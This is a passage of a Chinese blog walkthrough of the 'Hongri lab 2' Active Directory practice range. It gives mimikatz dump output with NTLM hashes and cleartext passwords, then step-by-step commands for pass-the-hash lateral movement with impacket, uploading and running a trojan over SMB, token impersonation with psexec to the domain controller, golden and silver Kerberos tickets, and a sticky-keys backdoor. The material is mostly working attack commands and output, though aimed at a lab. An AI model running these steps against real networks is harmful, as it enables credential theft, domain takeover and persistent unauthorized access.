+     [00000003] Primary
+     * Username : WEB$
+     * Domain   : DE1AY
+     * NTLM     : 124f918941c21f51bfe68f4e2a59b2fc
+     * SHA1     : 5c04dc8560a5c060d61b5b66ce973837be30a524
+    tspkg :
+    wdigest :
+     * Username : WEB$
+     * Domain   : DE1AY
+     * Password : a6 11 f4 bb c7 69 8e 43 cb 12 d0 8e 40 1d e5 71 0e 3a 24 27 79 79 3b 66 b1 85 c8 d4 3b 19 0d 25 34 75 87 d7 79 d9 44 fd 28 da 61 26 36 3c 34 32 f5 05 fb 65 fc 15 cc 35 7c 77 1f 27 4a 0d 22 8c 59 89 9d 9a 5d 3c d7 5b 1c 80 97 a0 a8 c5 b5 db 93 c6 16 e4 ca 18 a9 f9 1f 84 1d 73 2b 7d 33 c8 22 cb 30 ec 94 02 69 ec ee 6c 29 8a 2e 98 29 9a 5c 30 e2 e2 96 49 f1 ab ed a9 1e 54 cc 1a 36 49 e4 62 53 a1 87 29 cc ee e7 62 33 65 6f 1b 05 bc 9a 11 5a ad a9 2b 18 35 1d 29 94 22 f8 87 84 20 f0 39 99 8d 15 bb 6e d5 fe 22 aa f2 44 b3 91 43 68 5e ee f6 f6 55 a9 25 1d 7c 17 3f 1e 09 28 cc 41 52 ea c5 29 a8 d7 13 f3 15 de ed 1a 13 1b a8 91 b5 fb a1 1f 27 24 a5 80 58 4f 62 54 f4 ef 94 86 ea 41 36 d6 a3 89 87 61 a2 de de 9b ac 52 ed 
+    kerberos :
+     * Username : web$
+     * Domain   : DE1AY.COM
+     * Password : a6 11 f4 bb c7 69 8e 43 cb 12 d0 8e 40 1d e5 71 0e 3a 24 27 79 79 3b 66 b1 85 c8 d4 3b 19 0d 25 34 75 87 d7 79 d9 44 fd 28 da 61 26 36 3c 34 32 f5 05 fb 65 fc 15 cc 35 7c 77 1f 27 4a 0d 22 8c 59 89 9d 9a 5d 3c d7 5b 1c 80 97 a0 a8 c5 b5 db 93 c6 16 e4 ca 18 a9 f9 1f 84 1d 73 2b 7d 33 c8 22 cb 30 ec 94 02 69 ec ee 6c 29 8a 2e 98 29 9a 5c 30 e2 e2 96 49 f1 ab ed a9 1e 54 cc 1a 36 49 e4 62 53 a1 87 29 cc ee e7 62 33 65 6f 1b 05 bc 9a 11 5a ad a9 2b 18 35 1d 29 94 22 f8 87 84 20 f0 39 99 8d 15 bb 6e d5 fe 22 aa f2 44 b3 91 43 68 5e ee f6 f6 55 a9 25 1d 7c 17 3f 1e 09 28 cc 41 52 ea c5 29 a8 d7 13 f3 15 de ed 1a 13 1b a8 91 b5 fb a1 1f 27 24 a5 80 58 4f 62 54 f4 ef 94 86 ea 41 36 d6 a3 89 87 61 a2 de de 9b ac 52 ed 
+    ssp :
+    credman :
+
+Authentication Id : 0 ; 13459013 (00000000:00cd5e45)
+Session           : NewCredentials from 0
+User Name         : Administrator
+Domain            : DE1AY
+Logon Server      : (null)
+Logon Time        : 2023/12/12 19:41:27
+SID               : S-1-5-21-2756371121-2868759905-3853650604-500
+    msv :
+     [00000003] Primary
+     * Username : administrator
+     * Domain   : owa.god.org
+     * NTLM     : c377ba8a4dd52401bc404dbe49771bbc
+    tspkg :
+     * Username : administrator
+     * Domain   : owa.god.org
+     * Password : (null)
+    wdigest :
+     * Username : administrator
+     * Domain   : owa.god.org
+     * Password : (null)
+    kerberos :
+     * Username : administrator
+     * Domain   : owa.god.org
+     * Password : (null)
+    ssp :
+     [00000000]
+     * Username : administrator
+     * Domain   : (null)
+     * Password : qwe123!@#
+    credman :
+
+Authentication Id : 0 ; 2701137 (00000000:00293751)
+Session           : RemoteInteractive from 2
+User Name         : qingfeng
+Domain            : WEB
+Logon Server      : WEB
+Logon Time        : 2023/12/12 16:29:39
+SID               : S-1-5-21-3767205380-3469466069-2137393323-1007
+    msv :
+     [00000003] Primary
+     * Username : qingfeng
+     * Domain   : WEB
+     * LM       : 1319b0fa23c89f2d7e51f0bf38bde884
+     * NTLM     : 6912928308e3cda903e6d75bd6091a20
+     * SHA1     : 4687d6f9b23b55f21825bc5157fe2cbe707c07de
+    tspkg :
+     * Username : qingfeng
+     * Domain   : WEB
+     * Password : qwer1234!
+    wdigest :
+     * Username : qingfeng
+     * Domain   : WEB
+     * Password : qwer1234!
+    kerberos :
+     * Username : qingfeng
+     * Domain   : WEB
+     * Password : qwer1234!
+    ssp :
+    credman :
+
+Authentication Id : 0 ; 1452491 (00000000:001629cb)
+Session           : Service from 0
+User Name         : DefaultAppPool
+Domain            : IIS APPPOOL
+Logon Server      : (null)
+Logon Time        : 2023/12/12 16:06:55
+SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
+    msv :
+     [00000003] Primary
+     * Username : WEB$
+     * Domain   : DE1AY
+     * NTLM     : 124f918941c21f51bfe68f4e2a59b2fc
+     * SHA1     : 5c04dc8560a5c060d61b5b66ce973837be30a524
+    tspkg :
+     * Username : WEB$
+     * Domain   : DE1AY
+     * Password : a6 11 f4 bb c7 69 8e 43 cb 12 d0 8e 40 1d e5 71 0e 3a 24 27 79 79 3b 66 b1 85 c8 d4 3b 19 0d 25 34 75 87 d7 79 d9 44 fd 28 da 61 26 36 3c 34 32 f5 05 fb 65 fc 15 cc 35 7c 77 1f 27 4a 0d 22 8c 59 89 9d 9a 5d 3c d7 5b 1c 80 97 a0 a8 c5 b5 db 93 c6 16 e4 ca 18 a9 f9 1f 84 1d 73 2b 7d 33 c8 22 cb 30 ec 94 02 69 ec ee 6c 29 8a 2e 98 29 9a 5c 30 e2 e2 96 49 f1 ab ed a9 1e 54 cc 1a 36 49 e4 62 53 a1 87 29 cc ee e7 62 33 65 6f 1b 05 bc 9a 11 5a ad a9 2b 18 35 1d 29 94 22 f8 87 84 20 f0 39 99 8d 15 bb 6e d5 fe 22 aa f2 44 b3 91 43 68 5e ee f6 f6 55 a9 25 1d 7c 17 3f 1e 09 28 cc 41 52 ea c5 29 a8 d7 13 f3 15 de ed 1a 13 1b a8 91 b5 fb a1 1f 27 24 a5 80 58 4f 62 54 f4 ef 94 86 ea 41 36 d6 a3 89 87 61 a2 de de 9b ac 52 ed 
+    wdigest :
+     * Username : WEB$
+     * Domain   : DE1AY
+     * Password : a6 11 f4 bb c7 69 8e 43 cb 12 d0 8e 40 1d e5 71 0e 3a 24 27 79 79 3b 66 b1 85 c8 d4 3b 19 0d 25 34 75 87 d7 79 d9 44 fd 28 da 61 26 36 3c 34 32 f5 05 fb 65 fc 15 cc 35 7c 77 1f 27 4a 0d 22 8c 59 89 9d 9a 5d 3c d7 5b 1c 80 97 a0 a8 c5 b5 db 93 c6 16 e4 ca 18 a9 f9 1f 84 1d 73 2b 7d 33 c8 22 cb 30 ec 94 02 69 ec ee 6c 29 8a 2e 98 29 9a 5c 30 e2 e2 96 49 f1 ab ed a9 1e 54 cc 1a 36 49 e4 62 53 a1 87 29 cc ee e7 62 33 65 6f 1b 05 bc 9a 11 5a ad a9 2b 18 35 1d 29 94 22 f8 87 84 20 f0 39 99 8d 15 bb 6e d5 fe 22 aa f2 44 b3 91 43 68 5e ee f6 f6 55 a9 25 1d 7c 17 3f 1e 09 28 cc 41 52 ea c5 29 a8 d7 13 f3 15 de ed 1a 13 1b a8 91 b5 fb a1 1f 27 24 a5 80 58 4f 62 54 f4 ef 94 86 ea 41 36 d6 a3 89 87 61 a2 de de 9b ac 52 ed 
+    kerberos :
+     * Username : WEB$
+     * Domain   : de1ay.com
+     * Password : a6 11 f4 bb c7 69 8e 43 cb 12 d0 8e 40 1d e5 71 0e 3a 24 27 79 79 3b 66 b1 85 c8 d4 3b 19 0d 25 34 75 87 d7 79 d9 44 fd 28 da 61 26 36 3c 34 32 f5 05 fb 65 fc 15 cc 35 7c 77 1f 27 4a 0d 22 8c 59 89 9d 9a 5d 3c d7 5b 1c 80 97 a0 a8 c5 b5 db 93 c6 16 e4 ca 18 a9 f9 1f 84 1d 73 2b 7d 33 c8 22 cb 30 ec 94 02 69 ec ee 6c 29 8a 2e 98 29 9a 5c 30 e2 e2 96 49 f1 ab ed a9 1e 54 cc 1a 36 49 e4 62 53 a1 87 29 cc ee e7 62 33 65 6f 1b 05 bc 9a 11 5a ad a9 2b 18 35 1d 29 94 22 f8 87 84 20 f0 39 99 8d 15 bb 6e d5 fe 22 aa f2 44 b3 91 43 68 5e ee f6 f6 55 a9 25 1d 7c 17 3f 1e 09 28 cc 41 52 ea c5 29 a8 d7 13 f3 15 de ed 1a 13 1b a8 91 b5 fb a1 1f 27 24 a5 80 58 4f 62 54 f4 ef 94 86 ea 41 36 d6 a3 89 87 61 a2 de de 9b ac 52 ed 
+    ssp :
+    credman :
+
+Authentication Id : 0 ; 793579 (00000000:000c1beb)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : DE1AY
+Logon Server      : DC
+Logon Time        : 2023/12/12 16:01:44
+SID               : S-1-5-21-2756371121-2868759905-3853650604-500
+    msv :
+     [00000003] Primary
+     * Username : Administrator
+     * Domain   : DE1AY
+     * LM       : f67ce55ac831223dc187b8085fe1d9df
+     * NTLM     : 161cff084477fe596a5db81874498a24
+     * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
+    tspkg :
+     * Username : Administrator
+     * Domain   : DE1AY
+     * Password : 1qaz@WSX
+    wdigest :
+     * Username : Administrator
+     * Domain   : DE1AY
+     * Password : 1qaz@WSX
+    kerberos :
+     * Username : Administrator
+     * Domain   : de1ay.com
+     * Password : 1qaz@WSX
+    ssp :
+    credman :
+</code></pre>
+<p>可以注意到这里有多个administrator，到底选择哪一个呢？</p>
+<p>会抓到多个是因为administrator修改过密码，而之前的密码信息还保存在内存中，所以可以看到多个结果</p>
+<p>正确的结果往往是靠前的那个，表示是最新的。</p>
+<h3 id="横向getshell"><a href="#横向getshell" class="headerlink" title="横向getshell"></a>横向getshell</h3><p>这里我们选择就是靠前的NTLM进行横向：</p>
+<p>c377ba8a4dd52401bc404dbe49771bbc</p>
+<p>横向命令：</p>
+<pre class=" language-xml"><code class="language-xml">proxychains4 impacket-wmiexec administrator@10.10.10.10 -hashes :c377ba8a4dd52401bc404dbe49771bbc
+</code></pre>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212204247-gsnefrx.png" alt="image">​</p>
+<p>这里已经就可以执行命令了，但是有个问题，如何上线呢？</p>
+<p>Windows上线需要exe来执行木马程序，所以问题来了：如何利用Hash传递进行文件传输</p>
+<h3 id="Hash传递文件传输"><a href="#Hash传递文件传输" class="headerlink" title="Hash传递文件传输"></a>Hash传递文件传输</h3><p>Windows天生自带SMB服务，本身就是服务于文件传输的，所以我们可以利用impacket项目的smbclient.py进行文件传输，命令如下：</p>
+<pre class=" language-xml"><code class="language-xml">proxychains4 python smbclient.py -hashes :c377ba8a4dd52401bc404dbe49771bbc de1ay.com/administrator@10.10.10.10
+</code></pre>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215102252-4ruzfm3.png" alt="image">​</p>
+<p>因为我们没有选择共享的文件夹，需要先使用shares看一下有哪些共享可以使用：</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215102318-bfmvyg1.png" alt="image">​</p>
+<p>一般来说，默认开启一个C盘共享，这里就使用use C$选择C盘根目录</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/83ccaf034441cd191c8e66a16db09f8-20231215102428-x52ahmi.png" alt="image"></p>
+<p>尝试上传smbclient.py查看结果：</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/3deaffc9816ab19e12a5b913604aba0-20231215102452-iy4knfm.png" alt="image"></p>
+<p>发现可用，我们就再上传一个木马程序<code>put dc.exe</code>​：</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215102543-zv4cscd.png" alt="image">​</p>
+<p>上传成功我们只要执行这个木马程序即可</p>
+<p>返回我们刚才的smbexec-shell，然后执行C:\dc.exe即可成功上线：</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215102619-51erplh.png" alt="image">​</p>
+<h2 id="令牌-内网横向"><a href="#令牌-内网横向" class="headerlink" title="令牌-内网横向"></a>令牌-内网横向</h2><p>看了官方路线似乎是使用黄金票据的，我们结合上面的抓密码，因为外围WEB机器是Win2008R2的，是可以看到明文的</p>
+<p>所以我们可以利用administrator的密码制作黄金票据来进行横向</p>
+<pre class=" language-xml"><code class="language-xml">rev2self # 清空票据
+make_token delay.com\Administrator qwe123!@# #创建一个administrator令牌
+jump psexec DC smb #利用psexec横向传递DC
+</code></pre>
+<p>执行成功后可以发现</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215103244-0i2y82m.png" alt="image">​</p>
+<p>DC也成功拿下</p>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>权限维持无非就是制作黄金票据、白银票据、镜像劫持啥的了，还有很多，就演示这三个</p>
+<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>制作黄金票据需要krbtgt的hash值，在DC的session中导出ntlm hash就可以看见</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215103950-vhu9r0l.png" alt="image">​</p>
+<p>SID是Run mimikaz可以看见：</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104029-bfgs7yz.png" alt="image">​</p>
+<p>然后选择一个用户制作黄金票据</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215103724-jjkj8ou.png" alt="image">​</p>
+<p>在外围机器制作黄金票据：</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104055-chfngf3.png" alt="image">​</p>
+<p>制作成功后就有了DC的控制权限</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104131-ssxpfwd.png" alt="image">​</p>
+<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>这个白银票据似乎没有默认选项，那就手敲命令吧：</p>
+<pre class=" language-xml"><code class="language-xml">klist purge  清除票据
+
+mimikatz kerberos::golden /user:administrator /domain:de1ay.com  /target:dc.de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604-500 /rc4:c377ba8a4dd52401bc404dbe49771bbc /services:cifs  /ptt
+
+kerberos::golden /domain:域名 /sid:域sid /target:目标服务器 /service:目标服务 /rc4:目标服务器的hash /user:xxx用户名 /ptt
+</code></pre>
+<p>这里演示是选择了administrator的NTML和SID</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215105235-a7iy7lw.png" alt="image">​</p>
+<p>这里是表示生成成功了，和黄金票据一样</p>
+<p>‍</p>
+<h3 id="镜像劫持"><a href="#镜像劫持" class="headerlink" title="镜像劫持"></a>镜像劫持</h3><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104635-2ixrfey.png" alt="image">​</p>
+<p>选择粘滞键当作后门：</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104705-bk65you.png" alt="image">​</p>
+<p>进入域控桌面，按五次shift即可得到命令行</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104620-r665fjo.png" alt="image">​</p>
+<p>‍</p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2"><span class="toc-number">1.</span> <span class="toc-text">红日靶场2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">靶场配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">基础配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.2.</span> <span class="toc-text">网卡配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E9%87%8D%E8%A6%81%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.3.</span> <span class="toc-text">最重要的配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E6%89%91"><span class="toc-number">1.1.4.</span> <span class="toc-text">拓扑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">1.3.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hash%E4%BC%A0%E9%80%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91"><span class="toc-number">1.4.</span> <span class="toc-text">hash传递-内网横向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.1.</span> <span class="toc-text">横向信息探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91getshell"><span class="toc-number">1.4.2.</span> <span class="toc-text">横向getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash%E4%BC%A0%E9%80%92%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-number">1.4.3.</span> <span class="toc-text">Hash传递文件传输</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91"><span class="toc-number">1.5.</span> <span class="toc-text">令牌-内网横向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.6.</span> <span class="toc-text">权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.6.1.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.6.2.</span> <span class="toc-text">白银票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%9C%E5%83%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">1.6.3.</span> <span class="toc-text">镜像劫持</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&text=红日靶场2"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&title=红日靶场2"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&is_video=false&description=红日靶场2"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=红日靶场2&body=Check out this article: https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&title=红日靶场2"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&title=红日靶场2"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&title=红日靶场2"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&title=红日靶场2"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&name=红日靶场2&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&t=红日靶场2"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    清风
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">首页</a></li><!--
+    --><!--
+      --><li><a href="/about/">关于</a></li><!--
+    --><!--
+      --><li><a href="/archives/">归档</a></li><!--
+    --><!--
+      --><li><a href="/categories/">分类</a></li><!--
+    --><!--
+      --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'qing3feng/qingfengComments';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
